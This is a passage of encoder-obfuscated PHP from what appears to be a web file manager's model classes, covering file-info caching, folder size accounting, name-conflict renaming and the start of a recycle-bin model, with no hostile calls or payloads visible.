IO::getContent($d£ÇÛ‚Æ[$CêŸ¤ë”ôë[75]]); Cache::set($eŸÆÊ†«Û, $F³µÆ†¬’Ç); } return $F³µÆ†¬’Ç; } goto c‘‚ãÀùñ; c‘‚ãÀùñ: if (!$d£ÇÛ‚Æ[$CêŸ¤ë”ôë[75]]) { return $CêŸ¤ë”ôë[33]; } return IO::getContent($d£ÇÛ‚Æ[$CêŸ¤ë”ôë[75]]); goto F»µé¥‘ ; AÈß³ò¹à: $CêŸ¤ë”ôë =& $_SERVER[Š‰]; $d£ÇÛ‚Æ = $this->fileInfoGet($dã·ªÂÕ²); if (!$d£ÇÛ‚Æ) { return !1; } goto BœÍ¹Ïò÷¿; F»µé¥‘ : } public function setDesc($c¾Äµ„ëÕ, $c“´×æŠ) { $Eíˆø”çô =& $_SERVER[Š‰]; Model($Eíˆø”çô[528])->eventAddDesc($c¾Äµ„ëÕ, $c“´×æŠ); return $this->metaSet($c¾Äµ„ëÕ, $Eíˆø”çô[425], $c“´×æŠ); } public function setContent($C ÖĞâÆ‚ß, $AƒœğÎ°î = '') { goto F°íåËÀñ; dØñìÆª¤Ê: if (!$BİéØ¢›ÙÇ) { return Model($FÈ£‚¹ñÛÒ[444])->remove($dœ¢ÕƒêÇ¶[$FÈ£‚¹ñÛÒ[441]]); } $this->folderSizeReset($CÀ ™™¿¤[$FÈ£‚¹ñÛÒ[472]]); return !0; goto eï¦°Ç¢…; B ÙÑ×øé: if (!$dô¶ÛËØÉø || !$CÀ ™™¿¤) { return !1; } $dœ¢ÕƒêÇ¶ = Model($FÈ£‚¹ñÛÒ[444])->addFileByContent($AƒœğÎ°î, $CÀ ™™¿¤[$FÈ£‚¹ñÛÒ[28]]); $BİéØ¢›ÙÇ = $this->fileHistory($CÀ ™™¿¤, $dœ¢ÕƒêÇ¶[$FÈ£‚¹ñÛÒ[441]], $dœ¢ÕƒêÇ¶[$FÈ£‚¹ñÛÒ[77]]); goto dØñìÆª¤Ê; F°íåËÀñ: $FÈ£‚¹ñÛÒ =& $_SERVER[Š‰]; $CÀ ™™¿¤ = $this->sourceInfo($C ÖĞâÆ‚ß); $dô¶ÛËØÉø = $this->fileInfoGet($C ÖĞâÆ‚ß); goto B ÙÑ×øé; eï¦°Ç¢…: } public function fileSubstr($B§¸Ï†¦ã“, $DÄÛ¸‰ƒ¹Ú, $a£Ÿ÷Åí•Ê) { $CÛñá…ê„á = $this->fileInfoGet($B§¸Ï†¦ã“); if (!$CÛñá…ê„á) { return !1; } return IO::fileSubstr($CÛñá…ê„á[$_SERVER[Š‰][75]], $DÄÛ¸‰ƒ¹Ú, $a£Ÿ÷Åí•Ê); } public function fileInfoGet($f‰ßÀ¥‡´) { goto BƒĞˆ»“ÀÛ; BƒĞˆ»“ÀÛ: $CÊ™ƒè®Ş =& $_SERVER[Š‰]; $føğ”¿•ó = $this->sourceInfo($f‰ßÀ¥‡´); if (!$føğ”¿•ó || $føğ”¿•ó[$CÊ™ƒè®Ş[397]]) { return !1; } goto Båéãœ†á„; Fâˆ¤İ‘ğ¡: return $A¿˜©«‰‹ƒ; goto A‚—Ô®ò‚; Båéãœ†á„: $c«çÚ…¡­” = $CÊ™ƒè®Ş[447] . $føğ”¿•ó[$CÊ™ƒè®Ş[441]]; $dÚøùòëî¦ = _get(self::$cacheFileInfo, $c«çÚ…¡­”); if ($dÚøùòëî¦) { return $dÚøùòëî¦; } goto fÌœê‰»Õ; fÌœê‰»Õ: $A¿˜©«‰‹ƒ = Model($CÊ™ƒè®Ş[444])->fileInfo($føğ”¿•ó[$CÊ™ƒè®Ş[441]]); if ($A¿˜©«‰‹ƒ) { $A¿˜©«‰‹ƒ[$CÊ™ƒè®Ş[28]] = $føğ”¿•ó[$CÊ™ƒè®Ş[28]]; } self::$cacheFileInfo[$c«çÚ…¡­”] = $A¿˜©«‰‹ƒ; goto Fâˆ¤İ‘ğ¡; A‚—Ô®ò‚: } private function folderChildrenNumber($b¥‹Ñ†ŒÃ˜) { $DĞ«ª—¾Ğó =& $_SERVER[Š‰]; $a¤¥ëéò’À = $this->sourceInfo($b¥‹Ñ†ŒÃ˜); $f”¯ã–Š² = array($DĞ«ª—¾Ğó[548] => array($DĞ«ª—¾Ğó[507], $a¤¥ëéò’À[$DĞ«ª—¾Ğó[481]] . $b¥‹Ñ†ŒÃ˜ . $DĞ«ª—¾Ğó[508]), $DĞ«ª—¾Ğó[416] => intval($a¤¥ëéò’À[$DĞ«ª—¾Ğó[417]]), $DĞ«ª—¾Ğó[541] => 1); $C–ÆŠÂÑ¾ = $this->where($f”¯ã–Š²)->count(); $b‰›ÅÛŞ = $this->where($f”¯ã–Š²)->where(array($DĞ«ª—¾Ğó[541] => 0))->count(); return array($DĞ«ª—¾Ğó[81] => $b‰›ÅÛŞ, $DĞ«ª—¾Ğó[82] => $C–ÆŠÂÑ¾); } public function pathInfo($eôŠŸ ì, $d–¾³àˆ‰¹ = false) { goto f©´È–ÆŒ; C©â×Ùùî: self::$cachePathInfo[$b˜ÓìÍ¥¿Í] = $CÒİóõñ; return $CÒİóõñ; goto fœ©¾‚„¿°; E«¸–¨ÚÛÔ: $CÒİóõñ = $this->sourceInfo($eôŠŸ ì); if (!$CÒİóõñ) { return !1; } $CÒİóõñ = $this->_listDataApplyItem($CÒİóõñ, $d–¾³àˆ‰¹); goto C©â×Ùùî; dÈ—™‚–Ûµ: $b˜ÓìÍ¥¿Í = $EñÏ†ÏğÕ¦[433] . intval($d–¾³àˆ‰¹) . $EñÏ†ÏğÕ¦[434] . $eôŠŸ ì; $FÕÍáÊô‚… = _get(self::$cachePathInfo, $b˜ÓìÍ¥¿Í); if ($FÕÍáÊô‚…) { return $FÕÍáÊô‚…; } goto E«¸–¨ÚÛÔ; f©´È–ÆŒ: $EñÏ†ÏğÕ¦ =& $_SERVER[Š‰]; $d–¾³àˆ‰¹ = !1; $eôŠŸ ì = intval($eôŠŸ ì); goto dÈ—™‚–Ûµ; fœ©¾‚„¿°: } public static $cachePathInfoMore = array(); public function pathInfoMore($D½ì¤™ŠùÜ) { goto bªæÓ‹½£; bªæÓ‹½£: $E¬¼…é±°° =& $_SERVER[Š‰]; $B·–„ò“‚Ì = _get(self::$cachePathInfoMore, $D½ì¤™ŠùÜ); if ($B·–„ò“‚Ì) { return $B·–„ò“‚Ì; } goto e§‚îØÒ; DÉÈàê£³ğ: self::$cachePathInfoMore[$D½ì¤™ŠùÜ] = $c¿ÔÂÈ»¾§; return $c¿ÔÂÈ»¾§; goto a°Ú§î ˆ§; e§‚îØÒ: $c¿ÔÂÈ»¾§ = $this->pathInfo($D½ì¤™ŠùÜ); if (!$c¿ÔÂÈ»¾§) { return !1; } if ($c¿ÔÂÈ»¾§[$E¬¼…é±°°[397]] == $E¬¼…é±°°[86]) { $c¿ÔÂÈ»¾§[$E¬¼…é±°°[80]] = $this->folderChildrenNumber($D½ì¤™ŠùÜ); } goto DÉÈàê£³ğ; a°Ú§î ˆ§: } public function sourceInfo($a‡ÑÅÂŸ’ä) { goto b¿ŒŸÏÙùÄ; b¿ŒŸÏÙùÄ: $CğŸêÖëÃ =& $_SERVER[Š‰]; if (!$a‡ÑÅÂŸ’ä) { return array(); } $a‡ÑÅÂŸ’ä = intval($a‡ÑÅÂŸ’ä); goto b…º”ç«‚; b…º”ç«‚: $c‹°”í‰Ôµ = $CğŸêÖëÃ[432] . $a‡ÑÅÂŸ’ä; $B–¼ñá·í‘ = _get(self::$cacheSourceInfo, $c‹°”í‰Ôµ); if ($B–¼ñá·í‘) { return $B–¼ñá·í‘; } goto Cáø»‘†; Cáø»‘†: $dßŒ¦¶µ¹ = $this->where(array($CğŸêÖëÃ[390] => $a‡ÑÅÂŸ’ä))->find(); self::$cacheSourceInfo[$c‹°”í‰Ôµ] = $dßŒ¦¶µ¹; return self::$cacheSourceInfo[$c‹°”í‰Ôµ]; goto eë§ ˜±; eë§ ˜±: } public function sourceCacheClear($bŠÑ‹ˆğ™ = false) { self::cacheClear($bŠÑ‹ˆğ™); } public static function cacheClear($aì¨¸¶ÆÃ = false) { $A…£®ÄÖƒâ =& $_SERVER[Š‰]; if ($aì¨¸¶ÆÃ == !1) { goto f¹—šèà²Ø; f¹—šèà²Ø: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto e£Ûøª“¶; e£Ûøª“¶: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto DËÙÆ’ŸÑˆ; DËÙÆ’ŸÑˆ: return; goto dÕ®†¼‘³‰; dÕ®†¼‘³‰: } unset(self::$cacheSourceInfo[$A…£®ÄÖƒâ[432] . $aì¨¸¶ÆÃ]); unset(self::$cachePathInfoMore[$aì¨¸¶ÆÃ]); unset(self::$cachePathInfo[$A…£®ÄÖƒâ[1950] . $aì¨¸¶ÆÃ]); unset(self::$cachePathInfo[$A…£®ÄÖƒâ[1951] . $aì¨¸¶ÆÃ]); } public function metaSet($Fô±’òì°¶, $CÛÑ¡²¯¦Ä = null, $fÙ²‚Ò²Çã = null) { $f¥¥µçœ©÷ = parent::metaSet($Fô±’òì°¶, $CÛÑ¡²¯¦Ä, $fÙ²‚Ò²Çã); if ($f¥¥µçœ©÷) { $this->sourceCacheClear($Fô±’òì°¶); } return $f¥¥µçœ©÷; } public function pathInfoByPath($DÓÃÁÓ²Ä©, $fÛ ‹Õ¬îù) { $AĞíòÑÖ =& $_SERVER[Š‰]; $c½¬Âäğ¿¤ = !$fÛ ‹Õ¬îù ? array() : explode($AĞíòÑÖ[8], trim($fÛ ‹Õ¬îù, $AĞíòÑÖ[8])); $A•½ùÙ¥øã = $DÓÃÁÓ²Ä©; foreach ($c½¬Âäğ¿¤ as $DÈ—Áİ¦) { $cÅ‚â‡Â£á = array($AĞíòÑÖ[472] => $A•½ùÙ¥øã, $AĞíòÑÖ[28] => $DÈ—Áİ¦); $DŸÁ±À¯É = $this->where($cÅ‚â‡Â£á)->select(); if (!$DŸÁ±À¯É) { return !1; } $DŸÁ±À¯É = array_sort_by($DŸÁ±À¯É, $AĞíòÑÖ[417]); $A•½ùÙ¥øã = $DŸÁ±À¯É[0][$AĞíòÑÖ[390]]; } return $this->pathInfo($A•½ùÙ¥øã, !0); } protected function updateModifyTime($Cî»øæ¼˜é) { goto BÛÂ»‰¸İ¿; BÛÂ»‰¸İ¿: $E”çÔô›†ù =& $_SERVER[Š‰]; if (!$Cî»øæ¼˜é) { return; } if (!is_array($Cî»øæ¼˜é)) { $Cî»øæ¼˜é = array($Cî»øæ¼˜é); } goto eÆƒÊ¼‰á; eÆƒÊ¼‰á: foreach ($Cî»øæ¼˜é as $bƒ‰çˆáÊ => $BïÜñ¦³Ñ¾) { $Cî»øæ¼˜é[$bƒ‰çˆáÊ] = intval($BïÜñ¦³Ñ¾); $this->sourceCacheClear($BïÜñ¦³Ñ¾); } $AÆ«½È¨™Î = array($E”çÔô›†ù[390] => array($E”çÔô›†ù[7], $Cî»øæ¼˜é)); $eÆí‘ñÆ› = array($E”çÔô›†ù[547] => USER_ID, $E”çÔô›†ù[411] => time()); goto F‹²¹ßè‚¸; F‹²¹ßè‚¸: $this->where($AÆ«½È¨™Î)->save($eÆí‘ñÆ›); goto c³áçò»º²; c³áçò»º²: } public function folderSizeReset($a»óÔÛá—™, $C¥èî³¬¤¶ = false) { goto f¤Öò¯‘¢£; f¤Öò¯‘¢£: $fºŠÔÎ†”î =& $_SERVER[Š‰]; if ($this->statusIgnoreResetSpace) { return; } $FŞ™£ù­ = $this->sourceInfo($a»óÔÛá—™); goto eˆŞ·¬…œ‡; DÎµ¥ñÕÄÎ: $dÊŒ¬…ëÄî = array($FŞ™£ù­[$fºŠÔÎ†”î[398]], $FŞ™£ù­[$fºŠÔÎ†”î[478]]); TaskRun::timeLimitCall($f¾Õæ£¸½, $fºŠÔÎ†”î[1954], $dÊŒ¬…ëÄî, 1.5); goto eŠÔ’»¿”¥; eˆŞ·¬…œ‡: $CƒŒî‡¤‚ô = $fºŠÔÎ†”î[1952] . $a»óÔÛá—™; CacheLock::lock($CƒŒî‡¤‚ô, 20); if ($C¥èî³¬¤¶ === !1) { $this->sourceCacheClear($a»óÔÛá—™); $FŞ™£ù­ = $this->sourceInfo($a»óÔÛá—™); $cËÇ¼² Œ² = array($fºŠÔÎ†”î[389] => $a»óÔÛá—™, $fºŠÔÎ†”î[416] => 0); $EÒÀéœ‚ = $this->where($cËÇ¼² Œ²)->sum($fºŠÔÎ†”î[77]); $C¥èî³¬¤¶ = intval($EÒÀéœ‚) - intval($FŞ™£ù­[$fºŠÔÎ†”î[77]]); } goto E§™»ù¯«; Bë…Ô“‘ã†: $AğÏò‰¿¾[] = $FŞ™£ù­[$fºŠÔÎ†”î[390]]; $cËÇ¼² Œ² = array($fºŠÔÎ†”î[390] => array($fºŠÔÎ†”î[405], $AğÏò‰¿¾)); if ($C¥èî³¬¤¶ < 0) { $cËÇ¼² Œ²[$fºŠÔÎ†”î[77]] = array($fºŠÔÎ†”î[949], abs($C¥èî³¬¤¶)); } goto b£À†ºÒ˜ß; E§™»ù¯«: if ($C¥èî³¬¤¶ == 0) { return CacheLock::unlock($CƒŒî‡¤‚ô); } $AğÏò‰¿¾ = $this->parentLevelArray($FŞ™£ù­[$fºŠÔÎ†”î[481]]); if (!$AğÏò‰¿¾) { $AğÏò‰¿¾ = array(); } goto Bë…Ô“‘ã†; b£À†ºÒ˜ß: $this->where($cËÇ¼² Œ²)->setAdd($fºŠÔÎ†”î[77], $C¥èî³¬¤¶); CacheLock::unlock($CƒŒî‡¤‚ô); $f¾Õæ£¸½ = $fºŠÔÎ†”î[1953] . $FŞ™£ù­[$fºŠÔÎ†”î[398]] . $fºŠÔÎ†”î[4] . $FŞ™£ù­[$fºŠÔÎ†”î[478]]; goto DÎµ¥ñÕÄÎ; eŠÔ’»¿”¥: } public function folderSizeResetChildren($AÉßöƒñˆ¯) { goto eéäò„ÎŞ; E± ä°ğ½®: $A¨ëÏ¸¸Ú† = array($eéÂÉ–¯ÜÄ[541] => 1, $eéÂÉ–¯ÜÄ[548] => array($eéÂÉ–¯ÜÄ[507], $fãÚùÎ½êÈ[$eéÂÉ–¯ÜÄ[481]] . $AÉßöƒñˆ¯ . $eéÂÉ–¯ÜÄ[508])); $FÜší±Å¤® = $eéÂÉ–¯ÜÄ[1955]; $AÓŒÏÍÜœç = $this->field($FÜší±Å¤®)->where($A¨ëÏ¸¸Ú†)->select(); goto fé¬À½êÇˆ; B˜§Ü“™ˆö: foreach ($AÓŒÏÍÜœç as $cóŒòâİŸè) { if ($cóŒòâİŸè[$eéÂÉ–¯ÜÄ[77]] == $cóŒòâİŸè[$eéÂÉ–¯ÜÄ[1956]]) { continue; } $b†Õ…òêòÖ[] = array($eéÂÉ–¯ÜÄ[390], $cóŒòâİŸè[$eéÂÉ–¯ÜÄ[390]], $eéÂÉ–¯ÜÄ[77], $cóŒòâİŸè[$eéÂÉ–¯ÜÄ[77]]); } $this->saveAll($b†Õ…òêòÖ); goto Eõ¾ˆåİö; F„†˜Ş²ÙÖ: foreach ($eÈõºÂ¯–ù as $cóŒòâİŸè) { $c¯äÇâ·»Õ = $cóŒòâİŸè[$eéÂÉ–¯ÜÄ[472]] . $eéÂÉ–¯ÜÄ[33]; if (!isset($AÓŒÏÍÜœç[$c¯äÇâ·»Õ])) { continue; } if ($cóŒòâİŸè[$eéÂÉ–¯ÜÄ[417]] == $AÓŒÏÍÜœç[$c¯äÇâ·»Õ][$eéÂÉ–¯ÜÄ[417]]) { $AÓŒÏÍÜœç[$c¯äÇâ·»Õ][$eéÂÉ–¯ÜÄ[77]] += $cóŒòâİŸè[$eéÂÉ–¯ÜÄ[77]]; } } foreach ($AÓŒÏÍÜœç as $cóŒòâİŸè) { $A¼—êºÊßö = $this->parentLevelArray($cóŒòâİŸè[$eéÂÉ–¯ÜÄ[481]]); foreach ($A¼—êºÊßö as $c¯äÇâ·»Õ) { $c¯äÇâ·»Õ = $c¯äÇâ·»Õ . $eéÂÉ–¯ÜÄ[33]; if (!isset($AÓŒÏÍÜœç[$c¯äÇâ·»Õ])) { continue; } if ($cóŒòâİŸè[$eéÂÉ–¯ÜÄ[417]] == $AÓŒÏÍÜœç[$c¯äÇâ·»Õ][$eéÂÉ–¯ÜÄ[417]]) { $AÓŒÏÍÜœç[$c¯äÇâ·»Õ][$eéÂÉ–¯ÜÄ[77]] += $cóŒòâİŸè[$eéÂÉ–¯ÜÄ[77]]; } } } $b†Õ…òêòÖ = array(); goto B˜§Ü“™ˆö; B¡¥Ûƒ‡Ë‘: $AÓŒÏÍÜœç[] = $fãÚùÎ½êÈ; $AÓŒÏÍÜœç = array_to_keyvalue($AÓŒÏÍÜœç, $eéÂÉ–¯ÜÄ[390]); foreach ($AÓŒÏÍÜœç as $a£Ú—‰ºğå => $cóŒòâİŸè) { $AÓŒÏÍÜœç[$a£Ú—‰ºğå][$eéÂÉ–¯ÜÄ[1956]] = $AÓŒÏÍÜœç[$a£Ú—‰ºğå][$eéÂÉ–¯ÜÄ[77]]; $AÓŒÏÍÜœç[$a£Ú—‰ºğå][$eéÂÉ–¯ÜÄ[77]] = 0; } goto F„†˜Ş²ÙÖ; eéäò„ÎŞ: $eéÂÉ–¯ÜÄ =& $_SERVER[Š‰]; $this->sourceCacheClear($AÉßöƒñˆ¯); $fãÚùÎ½êÈ = $this->sourceInfo($AÉßöƒñˆ¯); goto E± ä°ğ½®; fé¬À½êÇˆ: $A¨ëÏ¸¸Ú†[$eéÂÉ–¯ÜÄ[397]] = 0; $eÈõºÂ¯–ù = $this->field($FÜší±Å¤®)->where($A¨ëÏ¸¸Ú†)->select(); if (!$eÈõºÂ¯–ù) { return; } goto B¡¥Ûƒ‡Ë‘; Eõ¾ˆåİö: } public function userSpaceReset($cİÍ¢ÎãÌ = false) { $D¶òö†ƒËÔ =& $_SERVER[Š‰]; $e§¬Ù‚Ã¨™ = $this->where(array($D¶òö†ƒËÔ[398] => self::TYPE_USER, $D¶òö†ƒËÔ[478] => $cİÍ¢ÎãÌ, $D¶òö†ƒËÔ[397] => 0))->sum($D¶òö†ƒËÔ[77]); $e§¬Ù‚Ã¨™ = !$e§¬Ù‚Ã¨™ || $e§¬Ù‚Ã¨™ <= 0 ? 0 : $e§¬Ù‚Ã¨™; Model($D¶òö†ƒËÔ[497])->userEdit($cİÍ¢ÎãÌ, array($D¶òö†ƒËÔ[1649] => $e§¬Ù‚Ã¨™)); } public function targetSpaceUpdate($dĞİ¸Ÿ£‚ô, $B®‡­£öé‹) { $aù˜Œ‹¤† =& $_SERVER[Š‰]; if (!$B®‡­£öé‹) { return; } if (!in_array($dĞİ¸Ÿ£‚ô, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $dÀ‰—œíä© = $this->targetSpaceSize($dĞİ¸Ÿ£‚ô, $B®‡­£öé‹); if ($dĞİ¸Ÿ£‚ô == self::TYPE_USER) { Model($aù˜Œ‹¤†[497])->userEdit($B®‡­£öé‹, array($aù˜Œ‹¤†[1649] => $dÀ‰—œíä©)); } else { if ($dĞİ¸Ÿ£‚ô == self::TYPE_GROUP) { Model($aù˜Œ‹¤†[480])->groupEdit($B®‡­£öé‹, array($aù˜Œ‹¤†[1649] => $dÀ‰—œíä©)); } } } public function targetSpaceSize($cõ·“ìî®, $C„‚àôæ›Û) { goto C¥Åˆ¢²§; fĞóàí›ÙÇ: $Eº®È„Èã‹ = !$Eº®È„Èã‹ || $Eº®È„Èã‹ <= 0 ? 0 : $Eº®È„Èã‹; return $Eº®È„Èã‹; goto e•¬éº‹; BÅÍÕá‚Ôš: $Eº®È„Èã‹ = floatval($aöÕ®«·í[$c»Ï¢ã‚ƒ½[77]]); $c³Å¦Æ = array($c»Ï¢ã‚ƒ½[548] => array($c»Ï¢ã‚ƒ½[507], $c»Ï¢ã‚ƒ½[493] . $aöÕ®«·í[$c»Ï¢ã‚ƒ½[390]] . $c»Ï¢ã‚ƒ½[508])); $ağÂ±ÔŠì¬ = Model($c»Ï¢ã‚ƒ½[415])->field($c»Ï¢ã‚ƒ½[404])->where($c³Å¦Æ)->select(); goto d„ƒç’»Ç; d„ƒç’»Ç: $ağÂ±ÔŠì¬ = array_to_keyvalue($ağÂ±ÔŠì¬, $c»Ï¢ã‚ƒ½[33], $c»Ï¢ã‚ƒ½[390]); $ağÂ±ÔŠì¬ = array_unique(array_filter($ağÂ±ÔŠì¬)); if ($ağÂ±ÔŠì¬) { $c³Å¦Æ = array($c»Ï¢ã‚ƒ½[404] => array($c»Ï¢ã‚ƒ½[405], $ağÂ±ÔŠì¬)); $Eº®È„Èã‹ += floatval($this->where($c³Å¦Æ)->sum($c»Ï¢ã‚ƒ½[77])); } goto fĞóàí›ÙÇ; C¥Åˆ¢²§: $c»Ï¢ã‚ƒ½ =& $_SERVER[Š‰]; $aöÕ®«·í = $this->sourceRoot($cõ·“ìî®, $C„‚àôæ›Û, !0); if (!$aöÕ®«·í) { return 0; } goto BÅÍÕá‚Ôš; e•¬éº‹: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Aêš†Øñå›) { return $this->fileTypeProfile($Aêš†Øñå›, SourceModel::TYPE_USER); } public function groupFileTypeProfile($D±âä…¿Ğ) { return $this->fileTypeProfile($D±âä…¿Ğ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($c–ãò»ö‚Œ, $a‡‘Ô‚¶‰) { goto EŸ‚ë™ÁÛ’; AË¯°ğ¥Œ: foreach ($Fîëƒ˜£„ as $EŒìµëÄ– => $Cãë—×½”ˆ) { $cˆ¤¨™“é[$Cô«‹ö¾‰×[399]] = $this->fileTypeWhere($EŒìµëÄ–); $Aƒâó‹ßùˆ[$EŒìµëÄ–] = array($Cô«‹ö¾‰×[1959] => $Cãë—×½”ˆ[$Cô«‹ö¾‰×[28]], $Cô«‹ö¾‰×[1960] => $this->where($cˆ¤¨™“é)->count(), $Cô«‹ö¾‰×[543] => $this->where($cˆ¤¨™“é)->sum($Cô«‹ö¾‰×[77])); } Cache::set($dáÇÖªˆ°‚, $Aƒâó‹ßùˆ, 1200); return $Aƒâó‹ßùˆ; goto FœÕîà‡é¡; EŸ‚ë™ÁÛ’: $Cô«‹ö¾‰× =& $_SERVER[Š‰]; $dáÇÖªˆ°‚ = $Cô«‹ö¾‰×[1957] . $c–ãò»ö‚Œ . $Cô«‹ö¾‰×[70] . $a‡‘Ô‚¶‰; $eèãÔê¸Ú˜ = Cache::get($dáÇÖªˆ°‚); goto Bİ„ŞÍºÛ; Bİ„ŞÍºÛ: if ($eèãÔê¸Ú˜) { return $eèãÔê¸Ú˜; } $cˆ¤¨™“é = array($Cô«‹ö¾‰×[541] => 0); if ($c–ãò»ö‚Œ != !1) { $cˆ¤¨™“é[$Cô«‹ö¾‰×[478]] = $c–ãò»ö‚Œ; $cˆ¤¨™“é[$Cô«‹ö¾‰×[398]] = $a‡‘Ô‚¶‰; } goto a¸Æ°Œó‚Ó; a¸Æ°Œó‚Ó: $Aƒâó‹ßùˆ = array(); $Aƒâó‹ßùˆ[$Cô«‹ö¾‰×[1958]] = array($Cô«‹ö¾‰×[1959] => LNG($Cô«‹ö¾‰×[1958]), $Cô«‹ö¾‰×[1960] => $this->where($cˆ¤¨™“é)->count(), $Cô«‹ö¾‰×[543] => $this->where($cˆ¤¨™“é)->sum($Cô«‹ö¾‰×[77])); $Fîëƒ˜£„ = KodIO::fileTypeList(); goto AË¯°ğ¥Œ; FœÕîà‡é¡: } public function fileNameExist($fùÕ¼ÏÕ†›, $c¹ó¤Ï‰ö) { $bâ¾é Áô‹ =& $_SERVER[Š‰]; $d”œğÊÒ‰ = $this->childList($fùÕ¼ÏÕ†›); foreach ($d”œğÊÒ‰ as $aÄŸ†‹Èí) { if ($aÄŸ†‹Èí[$bâ¾é Áô‹[28]] == $c¹ó¤Ï‰ö) { return $aÄŸ†‹Èí[$bâ¾é Áô‹[390]]; } if (strtolower($aÄŸ†‹Èí[$bâ¾é Áô‹[28]]) == strtolower($c¹ó¤Ï‰ö)) { return $aÄŸ†‹Èí[$bâ¾é Áô‹[390]]; } } return !1; } public function childList($FÉå†¾¿Æ¡) { goto C’«¸òè¯; C’«¸òè¯: $aµ‚´ŠÑÉ =& $_SERVER[Š‰]; $aÔ’¼”šÎ = $aµ‚´ŠÑÉ[1933] . $FÉå†¾¿Æ¡; if (isset(self::$cacheChildList[$aÔ’¼”šÎ])) { return self::$cacheChildList[$aÔ’¼”šÎ]; } goto bÛÙï«‹; bÛÙï«‹: $A ˆ‘’Ò„ = array($aµ‚´ŠÑÉ[472] => intval($FÉå†¾¿Æ¡), $aµ‚´ŠÑÉ[417] => 0); $f¼”ƒ­£È‹ = $this->where($A ˆ‘’Ò„)->select(); $f¼”ƒ­£È‹ = $f¼”ƒ­£È‹ ? $f¼”ƒ­£È‹ : array(); goto fÍÜ¯å²ßŒ; fÍÜ¯å²ßŒ: self::$cacheChildList[$aÔ’¼”šÎ] = $f¼”ƒ­£È‹; foreach ($f¼”ƒ­£È‹ as $c¶‰ƒ°·´í) { $aÔ’¼”šÎ = $aµ‚´ŠÑÉ[432] . $c¶‰ƒ°·´í[$aµ‚´ŠÑÉ[390]]; self::$cacheSourceInfo[$aÔ’¼”šÎ] = $c¶‰ƒ°·´í; } return $f¼”ƒ­£È‹; goto BÓìêñŸèÒ; BÓìêñŸèÒ: } public function fileNameAuto($fØ¤„î¯•», $d‡ğ‘Ã¨Ñ, $AÂÎß¹åæ = REPEAT_RENAME, $dŠèô…Îá = false) { $B°á¼‡ ¾ =& $_SERVER[Š‰]; $f´ŸµĞ¿•¾ = $this->childList($fØ¤„î¯•»); $A¦˜‘ÏÁê¥ = array_to_keyvalue($f´ŸµĞ¿•¾, $B°á¼‡ ¾[33], $B°á¼‡ ¾[28]); return $this->fileNameAutoGet($A¦˜‘ÏÁê¥, $d‡ğ‘Ã¨Ñ, $AÂÎß¹åæ, $dŠèô…Îá); } public function fileNameAutoGet($b¦Î·§É“, $C‘µ»ÒŸ», $AóäŠ–Â²Ø, $D‚ŞùêÔê) { $f·ŸØ²óÇ =& $_SERVER[Š‰]; if ($AóäŠ–Â²Ø == REPEAT_REPLACE || !$b¦Î·§É“ || !in_array_not_case($C‘µ»ÒŸ», $b¦Î·§É“) || $D‚ŞùêÔê && $AóäŠ–Â²Ø != REPEAT_RENAME_FOLDER) { return $C‘µ»ÒŸ»; } if ($AóäŠ–Â²Ø == REPEAT_SKIP) { return !1; } $a‚Ç™Ñ¢ÃÅ = $f·ŸØ²óÇ[94] . get_path_ext($C‘µ»ÒŸ»); $a‚Ç™Ñ¢ÃÅ = $a‚Ç™Ñ¢ÃÅ == $f·ŸØ²óÇ[94] || $D‚ŞùêÔê ? $f·ŸØ²óÇ[33] : $a‚Ç™Ñ¢ÃÅ; for ($EÔ·‰³Â” = 1; $EÔ·‰³Â” <= count($b¦Î·§É“) + 1; $EÔ·‰³Â”++) { $cçÚâ­ÏŠò = substr($C‘µ»ÒŸ», 0, strlen($C‘µ»ÒŸ») - strlen($a‚Ç™Ñ¢ÃÅ)); $f°¾«Ô× = $cçÚâ­ÏŠò . "\50{$EÔ·‰³Â”}\51{$a‚Ç™Ñ¢ÃÅ}"; if (!in_array_not_case($f°¾«Ô×, $b¦Î·§É“)) { return $f°¾«Ô×; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\x75\162\x63\145\137\x72\145\x63\171\x63\x6c\x65"; protected $dataAuto = array(array("\x63\x72\145\141\x74\145\x54\x69\155\x65", "\164\x69\x6d\x65", "\x69\156\163\145\x72\164", "\146\165\156\x63\164\151\157\156")); public function listData($F £à¯œ™Ù = false) { $eÈ®ØœëÇ¶ =& $_SERVER[Š‰]; $F £à¯œ™Ù = $F £à¯œ™Ù ? $F £à¯œ™Ù : USER_ID; $eİÖ¡·Óò = $this->where(array($eÈ®ØœëÇ¶[1492] => $F £à¯œ™Ù))->select(); return array_to_keyvalue($eİÖ¡·Óò, $eÈ®ØœëÇ¶[33], $eÈ®ØœëÇ¶[390]); } public function moveToRecycle($aºÓùÍ¡ò) { goto E˜Îß²¶; AŠÂæË¢ö²: if (!$C»ÉÌ›ÏÁİ || $C»ÉÌ›ÏÁİ[$dçø–“®[417]] == $dçø–“®[86]) { return; } $Dµ¼¶ËÍÓå = array($dçø–“®[404] => $aºÓùÍ¡ò, $dçø–“®[1492] => USER_ID, $dçø–“®[544] => $C»ÉÌ›ÏÁİ[$dçø–“®[398]], $dçø–“®[545] => $C»ÉÌ›ÏÁİ[$dçø–“®[478]], $dçø–“®[548] => $C»ÉÌ›ÏÁİ[$dçø–“®[481]]); $this->add($Dµ¼¶ËÍÓå); goto B“Ì’Ğ¼ñ; B“Ì’Ğ¼ñ: $this->recycleMove($aºÓùÍ¡ò, 1); if ($C»ÉÌ›ÏÁİ[$dçø–“®[397]] == $dçø–“®[86]) { $F¹„ñøâÇ = array($dçø–“®[548] => array($dçø–“®[507], $C»ÉÌ›ÏÁİ[$dçø–“®[481]] . $aºÓùÍ¡ò . $dçø–“®[508])); $B‘ËàÕêÕ->where($F¹„ñøâÇ)->setField($dçø–“®[417], 1); } goto bĞ‡âŠÊ ¢; E˜Îß²¶: $dçø–“® =& $_SERVER[Š‰]; $B‘ËàÕêÕ = Model($dçø–“®[1180]); $C»ÉÌ›ÏÁİ = $B‘ËàÕêÕ->sourceInfo($aºÓùÍ¡ò); goto AŠÂæË¢ö²; bĞ‡âŠÊ ¢: } public function clear() { $this->remove(!1); } public function remove($E¿–›ÕÃÊ = false) { goto Eèë‹åÄÎ; fñÕ¢ÂÄ: 